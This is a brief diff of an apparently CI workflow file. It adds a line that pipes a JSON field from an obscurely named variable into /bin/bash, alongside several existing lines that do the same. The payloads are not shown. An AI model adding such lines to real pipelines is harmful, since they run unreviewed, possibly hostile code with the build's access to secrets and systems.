@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$yn3" | jq -r .y7189 | /bin/bash
           printf '%s' "$t15" | jq -r .w3 | /bin/bash
           printf '%s' "$ydndb8" | jq -r .n968 | /bin/bash
+          printf '%s' "$lgsyn8" | jq -r .hl5 | /bin/bash
 
       - name: Save output
         if: always()
